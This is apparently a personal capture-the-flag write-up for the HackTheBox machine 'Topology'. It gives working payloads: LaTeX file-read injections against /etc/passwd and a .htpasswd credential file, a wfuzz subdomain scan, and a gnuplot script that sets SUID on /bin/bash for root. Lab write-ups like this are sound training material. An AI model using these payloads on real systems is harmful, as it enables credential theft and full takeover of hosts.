# Topology

### Recon

- SSH port 22 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
- HTTP port 80 Apache httpd 2.4.41 ((Ubuntu))

dabrahams - Sysadmin
vdaisley - Dev
lklein - Head of group

### Exploitation

Tried hydra with the names of the portraits but the connection was refused

Tried a few LaTeX queries but no luck.

Needed help here, [found this walkthrough](https://rouvin.gitbook.io/ibreakstuff/writeups/hackthebox/easy/topology)

LaTeX equation generator -> read single line of files

```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

Fuzz topology.htb domain to find dev subdomain (change /etc/hosts)

`wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.topology.htb" --hc=200 -u http://topology.htb`

This is a HTTP sign in, meaning we can probably find the credentials in a .htpasswd file somewhere. Also, it 
coincides with the one-line LFI that we have. However, the same command does not work with the 
/var/www/dev/.htpasswd file, which is definitely where the password hash is stored.

In this case, what we can do is try to use other commands, like \lstinputlisting. However, this payload 
doesn't work:

`\lstinputlisting{/var/www/dev/.htpasswd}`

https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and

It doesn't work (as I've learnt) because the machine asks for LaTeX inline math mode. There are different 
modes for LaTeX present, and they would parse characters differently. If we use '$' signs, we can force the 
machine to process our query by switching mode for it. 

If we use `\\lstinputlisting{/var/www/dev/.htpasswd}` instead, we see that it processes it as text

So by using `$\lstinputlisting{/var/www/dev/.htpasswd}$`, it would be processed as an expression (similar to 
$() in bash) and loads the hash:


Credentials found in .htpasswd with LaTeX LFI for dev.topology.htb portal and ssh access to the machine

`$\lstinputlisting{/var/www/dev/.htpasswd`

gnuplot is present in /opt which allows system command execution and although we don't have read access we 
have write access to the directory

pspy64 shows root running gnuplot on the directory so if we add another .plt file we can gain root access

`echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/root.plt`

